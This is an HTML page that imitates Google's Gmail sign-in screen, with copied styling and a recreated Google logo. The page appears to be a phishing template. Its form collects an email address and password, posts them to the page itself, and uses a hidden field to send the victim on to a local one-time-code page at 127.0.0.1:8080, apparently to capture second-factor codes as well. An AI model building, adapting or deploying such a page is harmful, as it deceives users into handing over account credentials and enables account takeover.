```html

<!DOCTYPE html><html><head><meta charset="UTF-8"/>
	<title>Google Sign-In</title>
	<style type="text/css">body { margin: 0; padding: 0; background: #fff; font-family: Roboto, Arial, sans-serif; }
  .container { max-width: 450px; margin: 60px auto; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
  .logo { text-align: center; margin-bottom: 24px; }
  h1 { font-size: 24px; font-weight: 400; text-align: center; margin: 0 0 8px; color: #202124; }
  .subtitle { font-size: 16px; color: #202124; text-align: center; margin-bottom: 24px; }
  input[type=email], input[type=password] {
    width: 100%; padding: 13px 15px; border: 1px solid #dadce0;
    border-radius: 4px; font-size: 16px; box-sizing: border-box;
    outline: none; margin-bottom: 24px;
  }
  input:focus { border-color: #1a73e8; border-width: 2px; }
  .btn { background: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; float: right; }
  .btn:hover { background: #1557b0; }
  .forgot { font-size: 14px; color: #1a73e8; text-decoration: none; line-height: 36px; }
  .footer { display: flex; justify-content: space-between; align-items: center; }
  .clearfix { clear: both; }
  .divider { border: none; border-top: 1px solid #dadce0; margin: 24px 0; }
	</style>
</head>
<body>
<div class="container">
<div class="logo"><svg height="24" viewBox="0 0 75 24" width="75"> <text font-family="Arial" font-size="22" font-weight="700" x="0" y="20"> <tspan fill="#4285F4">G</tspan><tspan fill="#EA4335">o</tspan><tspan fill="#FBBC05">o</tspan><tspan fill="#4285F4">g</tspan><tspan fill="#34A853">l</tspan><tspan fill="#EA4335">e</tspan> </text> </svg></div>

<h1>Welcome back</h1>

<div class="subtitle">Sign in to continue to Gmail</div>

<form action="" id="loginForm" method="POST"><input name="email" placeholder="Email or phone" required="" type="email"/> <input name="password" placeholder="Enter your password" required="" type="password"/> <input name="next" type="hidden" value="http://127.0.0.1:8080/otp/index.html"/>
<div class="footer"><a class="forgot" href="#">Forgot password?</a><button class="btn" type="submit">Next</button></div>

<div class="clearfix"> </div>
</form>

<hr class="divider"/>
<div style="text-align:center; font-size:13px; color:#5f6368;">Not your computer? Use Guest mode to sign in privately.</div>
</div>


</body></html>

```
